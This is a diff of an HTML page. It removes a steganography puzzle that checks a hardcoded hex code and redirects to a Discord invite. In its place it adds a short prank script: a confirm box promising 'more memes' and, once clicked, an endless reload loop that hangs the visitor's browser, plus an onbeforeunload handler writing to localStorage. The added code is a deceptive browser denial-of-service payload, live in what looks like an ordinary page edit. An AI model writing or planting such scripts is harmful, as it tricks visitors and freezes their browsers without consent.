@@ -1,71 +1,11 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>CmdGroup Entry</title>
-<style>
-  :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,Arial}
-  body{min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0;background:#061025;color:#e6eef8}
-  .wrap{width:min(560px,94%);text-align:center}
-  img{max-width:100%;height:auto;border-radius:8px;margin-bottom:18px;display:block;margin-left:auto;margin-right:auto}
-  h1{margin:0 0 12px;font-size:1.1rem;letter-spacing:1px}
-  .controls{display:flex;gap:8px;justify-content:center;align-items:center}
-  input{padding:10px 12px;border-radius:8px;border:1px solid rgba(255,255,255,.06);background:#081225;color:#e6eef8;font-size:1rem;min-width:220px}
-  button{padding:10px 14px;border-radius:8px;border:0;background:#0ea5a9;color:#021014;font-weight:700;cursor:pointer}
-  .msg{margin-top:12px;color:#a7c0d1;font-size:.95rem}
-</style>
-</head>
-<body>
-  <main class="wrap">
-    <img id="cover" src="https://i.ibb.co/nqJsdTVr/img.png" alt="" />
-    <h1>FIND THE CODE TO ACCESS! (hint: steganography)</h1>
+<html>
+  <script>
+onbeforeunload = function(){localStorage.x=1};
 
-    <div class="controls" role="form" aria-label="code form">
-      <input id="codeInput" type="text" inputmode="latin" autocomplete="off" placeholder="enter hex here" />
-      <button id="enterBtn">ENTER</button>
-    </div>
-
-    <div id="msg" class="msg" aria-live="polite"></div>
-  </main>
-
-<script>
-(() => {
-  const EXPECTED_HEX = "434D444752305550";
-  const input = document.getElementById('codeInput');
-  const btn = document.getElementById('enterBtn');
-  const msg = document.getElementById('msg');
-  const redirectUrl = "https://discord.gg/dkwzdPP3Hp";
-
-  function normalizeHex(s){
-    return String(s || '').replace(/\s+/g,'').toUpperCase();
-  }
-
-  function isValidHex(str){
-    return /^[0-9A-F]+$/.test(str) && (str.length % 2 === 0);
-  }
-
-  function handleSubmit(){
-    msg.textContent = '';
-    const raw = normalizeHex(input.value);
-    if(!isValidHex(raw)){
-      msg.textContent = 'Input must be valid hexadecimal.';
-      return;
-    }
-    if(raw === EXPECTED_HEX){
-      msg.textContent = 'Access granted — redirecting...';
-      setTimeout(()=> { window.location.href = redirectUrl; }, 600);
-    } else {
-      msg.textContent = 'Incorrect code.';
-    }
-  }
-
-  btn.addEventListener('click', handleSubmit);
-  input.addEventListener('keydown', e => { if(e.key === 'Enter') handleSubmit(); });
-
-  const img = document.getElementById('cover');
-  img.addEventListener('error', () => { img.style.display = 'none'; }, {once:true});
-})();
+if(confirm("Press ok to get more memes!")){
+  setTimeout(function(){
+    while(1)location.reload(1)
+  }, 1000)
+}
 </script>
-</body>
 </html>
